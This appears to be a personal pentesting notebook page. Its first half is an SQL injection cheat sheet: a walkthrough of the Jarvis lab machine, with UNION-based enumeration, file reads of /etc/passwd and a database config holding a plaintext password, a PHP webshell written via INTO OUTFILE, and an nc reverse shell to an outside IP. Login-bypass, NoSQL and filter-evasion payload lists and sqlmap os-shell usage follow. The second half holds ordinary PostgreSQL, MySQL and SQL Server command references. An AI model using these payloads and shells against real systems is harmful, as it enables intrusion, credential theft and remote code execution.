<h1 id="jarvis-case-blind-sqli"><a class="header" href="#jarvis-case-blind-sqli">JARVIS CASE BLIND SQLI</a></h1>
<hr />
<h2 id="identifing"><a class="header" href="#identifing">identifing</a></h2>
<p>We detect it with:</p>
<pre><code>http://jarvis.htb/room.php?cod=6 and 1=1
http://jarvis.htb/room.php?cod=6 and 1=2
</code></pre>
<h2 id="enumeration-1"><a class="header" href="#enumeration-1">enumeration</a></h2>
<pre><code>jarvis.htb/room.php?cod=6 order by 1
jarvis.htb/room.php?cod=6 order by 7
jarvis.htb/room.php?cod=6 order by 8 &gt; error
</code></pre>
<ul>
<li>we check what types are allowed</li>
</ul>
<pre><code>/room.php?cod=6 UNION SELECT 'a','a','a','a','a','a','a'
/room.php?cod=6 UNION SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL
jarvis.htb/room.php?cod=6 UNION SELECT 1,2,3,4,5,6,7
</code></pre>
<ul>
<li>
<p>show results we use -1 to show us the numbers elsewhere</p>
<pre><code>jarvis.htb/room.php?cod=-1 UNION SELECT 1,2,3,4,5,6,7
</code></pre>
</li>
</ul>
<p>it shows us 2,3,4,5</p>
<ul>
<li>
<p>we try to see the version in one of the printable fields</p>
<pre><code>jarvis.htb/room.php?cod=-1 UNION SELECT 1,@@verion,3,4,5,6,7
</code></pre>
</li>
<li>
<p>we continue listing</p>
</li>
<li>
<p>user, hostname , db</p>
</li>
</ul>
<pre><code>http://jarvis.htb/room.php?cod=-1%20UNION%20SELECT%20NULL,@@version,user(),@@hostname,5,6,7

user = DBadmin@localhost
hostname = jarvis
database() = HOTEL
</code></pre>
<ul>
<li>schema</li>
</ul>
<pre><code>jarvis.htb/room.php?cod=-1 UNION SELECT 1,(select SCHEMA_NAME from Information_Schema.SCHEMATA LIMIT3,1),3,4,5,6,7
</code></pre>
<ul>
<li>lfi</li>
</ul>
<pre><code>http://jarvis.htb/room.php?cod=-1%20UNION%20SELECT%20NULL,@@version,LOAD_FILE(%22/etc/passwd%22),4,5,NULL,NULL

daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
_apt:x:104:65534::/nonexistent:/bin/false
messagebus:x:105:110::/var/run/dbus:/bin/false
pepper:x:1000:1000:,,,:/home/pepper:/bin/bash
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
sshd:x:107:65534::/run/sshd:/usr/sbin/nologin

</code></pre>
<ul>
<li>lfi 2</li>
</ul>
<pre><code>/var/www/html/index.php

&lt;?php
          error_reporting(0);
          include("connection.php");
          include("roomobj.php");
          $result=$connection-&gt;query("select * from room");
          while($line=mysqli_fetch_array($result)){
            $room=new Room();
            $room-&gt;cod=$line['cod'];
            $room-&gt;name=$line['name'];
            $room-&gt;price=$line['price'];
            $room-&gt;star=$line['star'];
            $room-&gt;image=$line['image'];
            $room-&gt;mini=$line['mini'];

            $room-&gt;printRoom();
            }
          ?&gt;
</code></pre>
<ul>
<li>LFI 3</li>
</ul>
<pre><code>/var/www/html/connection.php

$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');

</code></pre>
<ul>
<li>Reverse shell</li>
</ul>
<pre><code>we created it


/room.php?cod=-1 UNION SELECT NULL,1,1,4,"&lt;?php system($_GET[\"cmd\"]); ?&gt;",NULL,NULL into OUTFILE"/var/www/html/shell3.php"
</code></pre>
<pre><code>we start it


/shell3.php?cmd=nc -nv 10.10.14.6 4444 -e /bin/bash
</code></pre>
<h1 id="second-order-sqli"><a class="header" href="#second-order-sqli">second order sqli</a></h1>
<hr />
<p>we register accounts with a sqli for example</p>
<pre><code>rop' or 2=2 #
' or 0=0 ​ --
' or 0=0 #
' or 0=0 #"
' or '1'='1'​ --
' or 1 ​ --'
' or 1=1​ --
' or 1=1 or ''='
' or 1=1 or ""=
' or a=a​ --
' or a=a
') or ('a'='a
'hi' or 'x'='x';
</code></pre>
<p>Then we log in rop’ or 2=2 #:password</p>
<h1 id="login-bypass"><a class="header" href="#login-bypass">Login Bypass:</a></h1>
<hr />
<p>replace ‘ with “ if fail</p>
<pre><code>' or '1'='1  
' or 1=1;--  
' or 1=1;#  
') or ('x'='x  
' or &lt;column&gt; like '%';--  
' or 1=1 LIMIT 1;--  

USERNAME:   ' or 1/*  
PASSWORD:   */ =1 --  

USERNAME: admin' or 'a'='a  
PASSWORD '#  

USERNAME: admin' --  
PASSWORD:
</code></pre>
<h1 id="inject-webshell"><a class="header" href="#inject-webshell">inject webshell</a></h1>
<hr />
<pre><code>Mysql
'*'   
'&amp;'  
'^'  
'-'  
' or true;--   
' or 1;--  

union all select "&lt;?php echo shell_exec($_GET['cmd']);?&gt;",2,3,4,5,6 into OUTFILE '/var/www/html/shell.php'
</code></pre>
<h1 id="nosql"><a class="header" href="#nosql">NoSql</a></h1>
<hr />
<h2 id="like-sql"><a class="header" href="#like-sql">like sql</a></h2>
<pre><code>select * from usernames where user='$user';

$user-&gt;findone(array(
"username"=&gt; "$user"
));
</code></pre>
<pre><code>users that are not the same ''
user-&gt;findone(array(
"username"=&gt; "{$ne:''}"
));

</code></pre>
<h2 id="injection-php"><a class="header" href="#injection-php">injection php</a></h2>
<p>url check if user exist</p>
<pre><code>username[$ne]=RandomNoexiste&amp;password[$ne]=noexiste
</code></pre>
<h2 id="injection-with-regex-php"><a class="header" href="#injection-with-regex-php">injection with regex php</a></h2>
<pre><code>check for 1 char and 4 char usernames
username[$regex]=^.{1}&amp;password=noexist
username[$regex]=^.{4}&amp;password=noexist
</code></pre>
<h2 id="nodejs-1"><a class="header" href="#nodejs-1">node.js</a></h2>
<ol>
<li>change Content-type application/json</li>
<li>convert payload to json</li>
</ol>
<pre><code>{
"username": { "$ne": "RandomNOExiste"},
"passowrd": { "$ne": "ipssec"},
"login":"login"
}

</code></pre>
<h1 id="automated-sql-injection-tools-sqlmap"><a class="header" href="#automated-sql-injection-tools-sqlmap">Automated sql injection tools [sqlmap]</a></h1>
<hr />
<p>look for vulnerabilities</p>
<pre><code>root@kali: sqlmap -u http:192.168.30.35 --crawl=1
</code></pre>
<p>Removing date</p>
<pre><code>root@kali:sqlmap -u http://192.168.30.35/comment.php?id=839 --dbms=mysql --dump --threads=5
</code></pre>
<p>other arguments:</p>
<pre><code>--os-shell: automatic code execution: os-shel&gt; ipconfig -&gt;succes
</code></pre>
<h3 id="top-sql-injections"><a class="header" href="#top-sql-injections">Top SQL Injections:</a></h3>
<p>1- &gt;&gt; ' OR 1=1 #</p>
<p>2- &gt;&gt; " OR 1=1 #</p>
<p>3- &gt;&gt; ' OR 1=1 ' LIMIT 1 #</p>
<p>4- &gt;&gt; " OR 1=1 ' LIMIT 1 #</p>
<p>5- &gt;&gt; %27%09OR%091%3D1%23 | (ENCODING to bypass the space filter by replacing it with tabs) | use BurpSuite &gt;&gt;<code>' OR 1=1#</code></p>
<p>6- &gt;&gt; %27%20%2F%2A%2A%2For%2F%2A%2A%2F1%3D1%23 | (ENCODING to bypass spaces and tabs filter) &gt;&gt;<code>' /**/or/**/1=1#</code></p>
<p><strong>Basic</strong></p>
<blockquote>
<blockquote>
<p>__' OR 1=1 ;-- - __</p>
<p>__') OR 1=1; -- - __</p>
<p><strong>' and 'a '='a</strong></p>
<p><strong>' and 'a'='b</strong></p>
</blockquote>
</blockquote>
<p><strong>Medium:</strong></p>
<blockquote>
<blockquote>
<p>1' and 1=1 | nbsp; True</p>
<p>1' and 1=0 | False</p>
<p>1' order by 1 | True</p>
<p>1' order by 10000 | False</p>
<p>1 or db_name()=1); |</p>
<p>1 or db_name(0)=1) | increase the number until the database does not show any errors</p>
<p>9999' UNION SELECT name,222,'else1' FROM master.syslogin; --</p>
</blockquote>
</blockquote>
<p><strong>Complex:</strong></p>
<blockquote>
<blockquote>
<p>union select 1, 2, 3 %23 | Bypass Web filters |</p>
<p>uNioN+sEleCt+1,2+%23 | Bypass Web filters |</p>
<p>uNioN<code>/**/</code>sEleCt<code>/**/</code>1,2<code>/**/</code>%23 | Bypass Web filters |</p>
<p>UniOn selEct 1,version() /*</p>
<p>UniOn selEct 1,database() /*</p>
<p>UniOn selEct 1,user() /*</p>
<p>UniOn selEct 1,table_name frOm information_schema.tables table_schema = '[database name]' /*</p>
<p>UniOn selEct 1,column_name frOm information_schema.columns table_name = '[table name]' /*</p>
<p>UniOn selEct 1,[column name] frOm [table name] /*</p>
<p>UniOn selEct 1,load_file('file location') /* Reading files:</p>
<p>UniOn selEct null,[file content] inTo outfile '/location/to/write/file/to' /* Writing files</p>
<p>union select 1, column_name, null, from Infromation_schema .columns where table_name = 0x769166 | hex encoding dbname</p>
<p>' union select 1, column_name, null, null, null, 5 from Infromation_schema.columns where table_name = 'accounts' |</p>
<p>' union select username, pass, is_admin from 'accounts' |</p>
<p>' union select 1, table_name, null, null, null, 5 from Infromation_schema.tables where table_schema = 'owasdb |</p>
</blockquote>
</blockquote>
<div style="break-before: page; page-break-before: always;"></div><h2 id="psql"><a class="header" href="#psql">PSQL</a></h2>
<p><a href="https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546#psql"></a></p>
<p>Magic words:</p>
<pre><code class="language-shell">psql -U postgres
</code></pre>
<p>Some interesting flags (to see all, use <code>-h</code> or <code>--help</code> depending on your psql version):</p>
<ul>
<li><code>-E</code>: will describe the underlaying queries of the <code>\</code> commands (cool for learning!)</li>
<li><code>-l</code>: psql will list all databases and then exit (useful if the user you connect with doesn't has a default database, like at AWS RDS)</li>
</ul>
<p>Most <code>\d</code> commands support additional param of <code>__schema__.name__</code> and accept wildcards like <code>*.*</code></p>
<ul>
<li><code>\?</code>: Show help (list of available commands with an explanation)</li>
<li><code>\q</code>: Quit/Exit</li>
<li><code>\c __database__</code>: Connect to a database</li>
<li><code>\d __table__</code>: Show table definition (columns, etc.) including triggers</li>
<li><code>\d+ __table__</code>: More detailed table definition including description and physical disk size</li>
<li><code>\l</code>: List databases</li>
<li><code>\dy</code>: List events</li>
<li><code>\df</code>: List functions</li>
<li><code>\di</code>: List indexes</li>
<li><code>\dn</code>: List schemas</li>
<li><code>\dt *.*</code>: List tables from all schemas (if <code>*.*</code> is omitted will only show SEARCH_PATH ones)</li>
<li><code>\dT+</code>: List all data types</li>
<li><code>\dv</code>: List views</li>
<li><code>\dx</code>: List all extensions installed</li>
<li><code>\df+ __function__</code> : Show function SQL code.</li>
<li><code>\x</code>: Pretty-format query results instead of the not-so-useful ASCII tables</li>
<li><code>\copy (SELECT * FROM __table_name__) TO 'file_path_and_name.csv' WITH CSV</code>: Export a table as CSV</li>
<li><code>\des+</code>: List all foreign servers</li>
<li><code>\dE[S+]</code>: List all foreign tables</li>
<li><code>\! __bash_command__</code>: execute <code>__bash_command__</code> (e.g. <code>\! ls</code>)</li>
</ul>
<p>User Related:</p>
<ul>
<li><code>\du</code>: List users</li>
<li><code>\du __username__</code>: List a username if present.</li>
<li><code>create role __test1__</code>: Create a role with an existing username.</li>
<li><code>create role __test2__ noinherit login password __passsword__;</code>: Create a role with username and password.</li>
<li><code>set role __test__;</code>: Change role for current session to <code>__test__</code>.</li>
<li><code>grant __test2__ to __test1__;</code>: Allow <code>__test1__</code> to set its role as <code>__test2__</code>.</li>
<li><code>\deu+</code>: List all user mapping on server</li>
</ul>
<h2 id="configuration"><a class="header" href="#configuration">Configuration</a></h2>
<p><a href="https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546#configuration"></a></p>
<ul>
<li>Service management commands:</li>
</ul>
<pre><code>sudo service postgresql stop
sudo service postgresql start
sudo service postgresql restart
</code></pre>
<ul>
<li>Changing verbosity &amp; querying Postgres log:
<ol>
<li>First edit the config file, set a decent verbosity, save and restart postgres:</li>
</ol>
</li>
</ul>
<pre><code>sudo vim /etc/postgresql/9.3/main/postgresql.conf

# Uncomment/Change inside:
log_min_messages = debug5
log_min_error_statement = debug5
log_min_duration_statement = -1

sudo service postgresql restart
</code></pre>
<ol start="2">
<li>Now you will get tons of details of every statement, error, and even background tasks like VACUUMs</li>
</ol>
<pre><code>tail -f /var/log/postgresql/postgresql-9.3-main.log
</code></pre>
<ol start="3">
<li>How to add user who executed a PG statement to log (editing <code>postgresql.conf</code>):</li>
</ol>
<pre><code>log_line_prefix = '%t %u %d %a '
</code></pre>
<ul>
<li>
<p>Check Extensions enabled in postgres: <code>SELECT * FROM pg_extension;</code></p>
</li>
<li>
<p>Show available extensions: <code>SELECT * FROM pg_available_extension_versions;</code></p>
</li>
</ul>
<h2 id="create-command"><a class="header" href="#create-command">Create command</a></h2>
<p><a href="https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546#create-command"></a></p>
<p>There are many <code>CREATE</code> choices, like <code>CREATE DATABASE __database_name__</code>, <code>CREATE TABLE __table_name__</code> ... Parameters differ but can be checked <a href="https://www.postgresql.org/search/?u=%2Fdocs%2F9.1%2F&amp;q=CREATE">at the official documentation</a>.</p>
<h2 id="handy-queries"><a class="header" href="#handy-queries">Handy queries</a></h2>
<p><a href="https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546#handy-queries"></a></p>
<ul>
<li><code>SELECT * FROM pg_proc WHERE proname='__procedurename__'</code>: List procedure/function</li>
<li><code>SELECT * FROM pg_views WHERE viewname='__viewname__';</code>: List view (including the definition)</li>
<li><code>SELECT pg_size_pretty(pg_total_relation_size('__table_name__'));</code>: Show DB table space in use</li>
<li><code>SELECT pg_size_pretty(pg_database_size('__database_name__'));</code>: Show DB space in use</li>
<li><code>show statement_timeout;</code>: Show current user's statement timeout</li>
<li><code>SELECT * FROM pg_indexes WHERE tablename='__table_name__' AND schemaname='__schema_name__';</code>: Show table indexes</li>
<li>Get all indexes from all tables of a schema:</li>
</ul>
<pre><code class="language-sql">SELECT
   t.relname AS table_name,
   i.relname AS index_name,
   a.attname AS column_name
FROM
   pg_class t,
   pg_class i,
   pg_index ix,
   pg_attribute a,
    pg_namespace n
WHERE
   t.oid = ix.indrelid
   AND i.oid = ix.indexrelid
   AND a.attrelid = t.oid
   AND a.attnum = ANY(ix.indkey)
   AND t.relnamespace = n.oid
    AND n.nspname = 'kartones'
ORDER BY
   t.relname,
   i.relname
</code></pre>
<ul>
<li>Execution data:
<ul>
<li>Queries being executed at a certain DB:</li>
</ul>
</li>
</ul>
<pre><code class="language-sql">SELECT datname, application_name, pid, backend_start, query_start, state_change, state, query 
  FROM pg_stat_activity 
  WHERE datname='__database_name__';
</code></pre>
<ul>
<li>Get all queries from all dbs waiting for data (might be hung):</li>
</ul>
<pre><code class="language-sql">SELECT * FROM pg_stat_activity WHERE waiting='t'
</code></pre>
<ul>
<li>Currently running queries with process pid:</li>
</ul>
<pre><code class="language-sql">SELECT 
  pg_stat_get_backend_pid(s.backendid) AS procpid, 
  pg_stat_get_backend_activity(s.backendid) AS current_query
FROM (SELECT pg_stat_get_backend_idset() AS backendid) AS s;
</code></pre>
<ul>
<li>Get Connections by Database: <code>SELECT datname, numbackends FROM pg_stat_database;</code></li>
</ul>
<p>Casting:</p>
<ul>
<li><code>CAST (column AS type)</code> or <code>column::type</code></li>
<li><code>'__table_name__'::regclass::oid</code>: Get oid having a table name</li>
</ul>
<p>Query analysis:</p>
<ul>
<li><code>EXPLAIN __query__</code>: see the query plan for the given query</li>
<li><code>EXPLAIN ANALYZE __query__</code>: see and execute the query plan for the given query</li>
<li><code>ANALYZE [__table__]</code>: collect statistics</li>
</ul>
<p>Generating random data (<a href="https://www.citusdata.com/blog/2019/07/17/postgres-tips-for-average-and-power-user/">source</a>):</p>
<ul>
<li><code>INSERT INTO some_table (a_float_value) SELECT random() * 100000 FROM generate_series(1, 1000000) i;</code></li>
</ul>
<p>Get sizes of tables, indexes and full DBs:</p>
<pre><code class="language-sql">select current_database() as database,
  pg_size_pretty(total_database_size) as total_database_size,
  schema_name,
  table_name,
  pg_size_pretty(total_table_size) as total_table_size,
  pg_size_pretty(table_size) as table_size,
  pg_size_pretty(index_size) as index_size
  from ( select table_name,
          table_schema as schema_name,
          pg_database_size(current_database()) as total_database_size,
          pg_total_relation_size(table_name) as total_table_size,
          pg_relation_size(table_name) as table_size,
          pg_indexes_size(table_name) as index_size
          from information_schema.tables
          where table_schema=current_schema() and table_name like 'table_%'
          order by total_table_size
      ) as sizes;
</code></pre>
<ul>
<li><a href="https://www.postgresql.org/docs/9.2/sql-copy.html">COPY command</a>: Import/export from CSV to tables:</li>
</ul>
<pre><code class="language-sql">COPY table_name [ ( column_name [, ...] ) ]
FROM { 'filename' | STDIN }
[ [ WITH ] ( option [, ...] ) ]

COPY { table_name [ ( column_name [, ...] ) ] | ( query ) }
TO { 'filename' | STDOUT }
[ [ WITH ] ( option [, ...] ) ]
</code></pre>
<ul>
<li>List all grants for a specific user</li>
</ul>
<pre><code class="language-sql">SELECT table_catalog, table_schema, table_name, privilege_type
FROM   information_schema.table_privileges
WHERE  grantee = 'user_to_check' ORDER BY table_name;
</code></pre>
<ul>
<li>List all assigned user roles</li>
</ul>
<pre><code class="language-sql">SELECT
    r.rolname,
    r.rolsuper,
    r.rolinherit,
    r.rolcreaterole,
    r.rolcreatedb,
    r.rolcanlogin,
    r.rolconnlimit,
    r.rolvaliduntil,
    ARRAY(SELECT b.rolname
      FROM pg_catalog.pg_auth_members m
      JOIN pg_catalog.pg_roles b ON (m.roleid = b.oid)
      WHERE m.member = r.oid) as memberof, 
    r.rolreplication
FROM pg_catalog.pg_roles r
ORDER BY 1;
</code></pre>
<ul>
<li>Check permissions in a table:</li>
</ul>
<pre><code class="language-sql">SELECT grantee, privilege_type
FROM information_schema.role_table_grants
WHERE table_name='name-of-the-table';
</code></pre>
<ul>
<li>Kill all Connections:</li>
</ul>
<pre><code class="language-sql">SELECT pg_terminate_backend(pg_stat_activity.pid)
FROM pg_stat_activity
WHERE datname = current_database() AND pid &lt;&gt; pg_backend_pid();
</code></pre>
<h2 id="keyboard-shortcuts"><a class="header" href="#keyboard-shortcuts">Keyboard shortcuts</a></h2>
<p><a href="https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546#keyboard-shortcuts"></a></p>
<ul>
<li><code>CTRL</code> + <code>R</code>: reverse-i-search</li>
</ul>
<h2 id="tools"><a class="header" href="#tools">Tools</a></h2>
<p><a href="https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546#tools"></a></p>
<ul>
<li><code>ptop</code> and <code>pg_top</code>: <code>top</code> for PG. Available on the APT repository from <code>apt.postgresql.org</code>.</li>
<li><a href="https://github.com/julmon/pg_activity">pg_activity</a>: Command line tool for PostgreSQL server activity monitoring.</li>
<li><a href="https://dba.stackexchange.com/questions/63453/is-there-a-psql-equivalent-of-bashs-reverse-search-history">Unix-like reverse search in psql</a>:</li>
</ul>
<pre><code class="language-shell">$ echo "bind "^R" em-inc-search-prev" &gt; $HOME/.editrc
$ source $HOME/.editrc
</code></pre>
<ul>
<li>Show IP of the DB Instance: <code>SELECT inet_server_addr();</code></li>
<li>File to save PostgreSQL credentials and permissions (format: <code>hostname:port:database:username:password</code>): <code>chmod 600 ~/.pgpass</code></li>
<li>Collect statistics of a database (useful to improve speed after a Database Upgrade as previous query plans are deleted): <code>ANALYZE VERBOSE;</code></li>
<li>To obtain the <code>CREATE TABLE</code> query of a table, any visual GUI like <a href="https://www.pgadmin.org/">pgAdmin</a> allows to easily, but else you can use <code>pg_dump</code>, e.g.: <code>pg_dump -t '&lt;schema&gt;.&lt;table&gt;' --schema-only &lt;database&gt;</code> (<a href="https://stackoverflow.com/questions/2593803/how-to-generate-the-create-table-sql-statement-for-an-existing-table-in-postgr">source</a>)</li>
</ul>
<h2 id="resources--documentation"><a class="header" href="#resources--documentation">Resources &amp; Documentation</a></h2>
<p><a href="https://gist.github.com/Kartones/dd3ff5ec5ea238d4c546#resources--documentation"></a></p>
<ul>
<li><a href="https://wiki.postgresql.org/wiki/Operations_cheat_sheet">Operations Cheat Sheet</a>: Official PG wiki cheat sheet with an amazing amount of explanations of many topics, features, and many many internal implementation details</li>
<li><a href="https://postgresweekly.com/">Postgres Weekly</a> newsletter: The best way IMHO to keep up to date with PG news</li>
<li><a href="https://mydbanotebook.org/psql_tips_all.html">100 psql Tips</a>: Name says all, lots of useful tips!</li>
<li><a href="https://pgexercises.com/">PostgreSQL Exercises</a>: An awesome resource to learn to learn SQL, teaching you with simple examples in a great visual way. <strong>Highly recommended</strong>.</li>
<li><a href="https://severalnines.com/blog/performance-cheat-sheet-postgresql">A Performance Cheat Sheet for PostgreSQL</a>: Great explanations of <code>EXPLAIN</code>, <code>EXPLAIN ANALYZE</code>, <code>VACUUM</code>, configuration parameters and more. Quite interesting if you need to tune-up a postgres setup.</li>
<li><a href="https://github.com/jberkus/annotated.conf">annotated.conf</a>: Annotations of all 269 postgresql.conf settings for PostgreSQL 10.</li>
<li><code>psql -c "\l+" -H -q postgres &gt; out.html</code>: Generate a html report of your databases (source: <a href="https://twitter.com/westermanndanie/status/1242117182982586372">Daniel Westermann</a>)</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div><h2 id="commands"><a class="header" href="#commands">Commands</a></h2>
<p><a href="https://gist.github.com/hofmannsven/9164408#commands"></a></p>
<p>Access monitor: <code>mysql -u [username] -p;</code> (will prompt for password)</p>
<p>Show all databases: <code>show databases;</code></p>
<p>Access database: <code>mysql -u [username] -p [database]</code> (will prompt for password)</p>
<p>Create new database: <code>create database [database];</code></p>
<p>Select database: <code>use [database];</code></p>
<p>Determine what database is in use: <code>select database();</code></p>
<p>Show all tables: <code>show tables;</code></p>
<p>Show table structure: <code>describe [table];</code></p>
<p>List all indexes on a table: <code>show index from [table];</code></p>
<p>Create new table with columns: <code>CREATE TABLE [table] ([column] VARCHAR(120), [another-column] DATETIME);</code></p>
<p>Adding a column: <code>ALTER TABLE [table] ADD COLUMN [column] VARCHAR(120);</code></p>
<p>Adding a column with an unique, auto-incrementing ID: <code>ALTER TABLE [table] ADD COLUMN [column] int NOT NULL AUTO_INCREMENT PRIMARY KEY;</code></p>
<p>Inserting a record: <code>INSERT INTO [table] ([column], [column]) VALUES ('[value]', '[value]');</code></p>
<p>MySQL function for datetime input: <code>NOW()</code></p>
<p>Selecting records: <code>SELECT * FROM [table];</code></p>
<p>Explain records: <code>EXPLAIN SELECT * FROM [table];</code></p>
<p>Selecting parts of records: <code>SELECT [column], [another-column] FROM [table];</code></p>
<p>Counting records: <code>SELECT COUNT([column]) FROM [table];</code></p>
<p>Counting and selecting grouped records: <code>SELECT *, (SELECT COUNT([column]) FROM [table]) AS count FROM [table] GROUP BY [column];</code></p>
<p>Selecting specific records: <code>SELECT * FROM [table] WHERE [column] = [value];</code> (Selectors: <code>&lt;</code>, <code>&gt;</code>, <code>!=</code>; combine multiple selectors with <code>AND</code>, <code>OR</code>)</p>
<p>Select records containing <code>[value]</code>: <code>SELECT * FROM [table] WHERE [column] LIKE '%[value]%';</code></p>
<p>Select records starting with <code>[value]</code>: <code>SELECT * FROM [table] WHERE [column] LIKE '[value]%';</code></p>
<p>Select records starting with <code>val</code> and ending with <code>ue</code>: <code>SELECT * FROM [table] WHERE [column] LIKE '[val_ue]';</code></p>
<p>Select a range: <code>SELECT * FROM [table] WHERE [column] BETWEEN [value1] and [value2];</code></p>
<p>Select with custom order and only limit: <code>SELECT * FROM [table] WHERE [column] ORDER BY [column] ASC LIMIT [value];</code> (Order: <code>DESC</code>, <code>ASC</code>)</p>
<p>Updating records: <code>UPDATE [table] SET [column] = '[updated-value]' WHERE [column] = [value];</code></p>
<p>Deleting records: <code>DELETE FROM [table] WHERE [column] = [value];</code></p>
<p>Delete <em>all records</em> from a table (without dropping the table itself): <code>DELETE FROM [table];</code> (This also resets the incrementing counter for auto generated columns like an id column.)</p>
<p>Delete all records in a table: <code>truncate table [table];</code></p>
<p>Removing table columns: <code>ALTER TABLE [table] DROP COLUMN [column];</code></p>
<p>Deleting tables: <code>DROP TABLE [table];</code></p>
<p>Deleting databases: <code>DROP DATABASE [database];</code></p>
<p>Custom column output names: <code>SELECT [column] AS [custom-column] FROM [table];</code></p>
<p>Export a database dump (more info <a href="http://stackoverflow.com/a/21091197/1815847">here</a>): <code>mysqldump -u [username] -p [database] &gt; db_backup.sql</code></p>
<p>Use <code>--lock-tables=false</code> option for locked tables (more info <a href="http://stackoverflow.com/a/104628/1815847">here</a>).</p>
<p>Import a database dump (more info <a href="http://stackoverflow.com/a/21091197/1815847">here</a>): <code>mysql -u [username] -p -h localhost [database] &lt; db_backup.sql</code></p>
<p>Logout: <code>exit;</code></p>
<h2 id="aggregate-functions"><a class="header" href="#aggregate-functions">Aggregate functions</a></h2>
<p><a href="https://gist.github.com/hofmannsven/9164408#aggregate-functions"></a></p>
<p>Select but without duplicates: <code>SELECT distinct name, email, acception FROM owners WHERE acception = 1 AND date &gt;= 2015-01-01 00:00:00</code></p>
<p>Calculate total number of records: <code>SELECT SUM([column]) FROM [table];</code></p>
<p>Count total number of <code>[column]</code> and group by <code>[category-column]</code>: <code>SELECT [category-column], SUM([column]) FROM [table] GROUP BY [category-column];</code></p>
<p>Get largest value in <code>[column]</code>: <code>SELECT MAX([column]) FROM [table];</code></p>
<p>Get smallest value: <code>SELECT MIN([column]) FROM [table];</code></p>
<p>Get average value: <code>SELECT AVG([column]) FROM [table];</code></p>
<p>Get rounded average value and group by <code>[category-column]</code>: <code>SELECT [category-column], ROUND(AVG([column]), 2) FROM [table] GROUP BY [category-column];</code></p>
<h2 id="multiple-tables"><a class="header" href="#multiple-tables">Multiple tables</a></h2>
<p><a href="https://gist.github.com/hofmannsven/9164408#multiple-tables"></a></p>
<p>Select from multiple tables: <code>SELECT [table1].[column], [table1].[another-column], [table2].[column] FROM [table1], [table2];</code></p>
<p>Combine rows from different tables: <code>SELECT * FROM [table1] INNER JOIN [table2] ON [table1].[column] = [table2].[column];</code></p>
<p>Combine rows from different tables but do not require the join condition: <code>SELECT * FROM [table1] LEFT OUTER JOIN [table2] ON [table1].[column] = [table2].[column];</code> (The left table is the first table that appears in the statement.)</p>
<p>Rename column or table using an <em>alias</em>: <code>SELECT [table1].[column] AS '[value]', [table2].[column] AS '[value]' FROM [table1], [table2];</code></p>
<h2 id="users-functions"><a class="header" href="#users-functions">Users functions</a></h2>
<p><a href="https://gist.github.com/hofmannsven/9164408#users-functions"></a></p>
<p>List all users: <code>SELECT User,Host FROM mysql.user;</code></p>
<p>Create new user: <code>CREATE USER 'username'@'localhost' IDENTIFIED BY 'password';</code></p>
<p>Grant <code>ALL</code> access to user for <code>*</code> tables: <code>GRANT ALL ON database.* TO 'user'@'localhost';</code></p>
<h2 id="find-out-the-ip-address-of-the-mysql-host"><a class="header" href="#find-out-the-ip-address-of-the-mysql-host">Find out the IP Address of the Mysql Host</a></h2>
<p><a href="https://gist.github.com/hofmannsven/9164408#find-out-the-ip-address-of-the-mysql-host"></a></p>
<p><code>SHOW VARIABLES WHERE Variable_name = 'hostname';</code> (<a href="http://serverfault.com/a/129646">source</a>)</p>
<div style="break-before: page; page-break-before: always;"></div><h2 id="how-to-install-sql-server--client"><a class="header" href="#how-to-install-sql-server--client">How to Install SQL Server &amp; Client</a></h2>
<p>See <a href="https://therootcompany.com/blog/mssql-server-on-ubuntu/">https://therootcompany.com/blog/mssql-server-on-ubuntu/</a> and <a href="https://docs.microsoft.com/en-us/sql/linux/quickstart-install-connect-ubuntu?view=sql-server-ver15">https://docs.microsoft.com/en-us/sql/linux/quickstart-install-connect-ubuntu?view=sql-server-ver15</a>.</p>
<p><code>sqlcmd</code> (covered above) is the client.</p>
<p>In short:</p>
<pre><code class="language-bash"># add gnupg2, just in case
sudo apt install -y gnupg2

# add Microsoft keys
curl https://packages.microsoft.com/keys/microsoft.asc | sudo apt-key add -
curl https://packages.microsoft.com/config/ubuntu/20.04/prod.list | sudo tee /etc/apt/sources.list.d/msprod.list

# install sqlcmd
sudo apt-get update -y
sudo apt-get install -y mssql-tools unixodbc-dev

# add sqlcmd to PATH
curl -sS https://webinstall.dev/pathman | bash
export PATH="$HOME/.local/bin:$PATH"

pathman add /opt/mssql-tools/bin
export PATH="/opt/mssql-tools/bin:$PATH"
</code></pre>
<p>For Windows see <a href="https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-ver15">https://docs.microsoft.com/en-us/sql/tools/sqlcmd-utility?view=sql-server-ver15</a>.</p>
<p>Alternatively, check out <a href="https://github.com/dbcli/mssql-cli">https://github.com/dbcli/mssql-cli</a>.</p>
